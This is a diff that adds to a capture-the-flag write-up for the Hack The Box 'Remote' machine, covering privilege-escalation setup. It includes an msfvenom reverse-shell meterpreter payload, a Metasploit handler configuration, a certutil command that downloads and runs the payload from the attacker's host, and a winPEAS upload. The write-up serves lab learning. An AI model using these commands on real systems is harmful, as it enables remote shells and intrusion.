@@ -366,3 +366,39 @@ Before we run the exploit I opened a webserver on 9000 and a nc listener on 9003
 
 ![alt text](https://github.com/vipertooth/HTB-Remote/blob/master/resources/lowpriv-shell.png)
 
+From here I start some manual enumeration and find I have access to the C:\User\Public\ and find user.txt in there. Sweet!
+
+Time to work on the Privesc.
+
+I start by creating a tmp folder and upload a meterpreter payload for more functionality.   
+`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.17.215 LPORT=9006 -f exe -o meter.exe`
+
+I also opened msfconsole to receive the meterpreter shell.
+
+```bash
+msf5 > use multi/handler
+msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > set LHOST 10.10.17.215
+LHOST => 10.10.17.215
+msf5 exploit(multi/handler) > set LPORT 9006
+LPORT => 9006
+msf5 exploit(multi/handler) > run -j
+[*] Exploit running as background job 7.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 10.10.17.215:9006 
+```
+
+I then uploaded it with `certutil -urlcache -split -f http://10.10.17.215:9000/meter.exe meter.exe` into the tmp directory and executed the payload.
+
+From here I upload winPEASx64.exe to start enumeration.
+```bash
+meterpreter > upload winPEASx64.exe
+[*] uploading  : winPEASx64.exe -> winPEASx64.exe
+[*] Uploaded 223.00 KiB of 223.00 KiB (100.0%): winPEASx64.exe -> winPEASx64.exe
+[*] uploaded   : winPEASx64.exe -> winPEASx64.exe
+meterpreter > 
+```
+
+This is a tool for finding privesc paths on the system. It also highlights higher priority targets. 
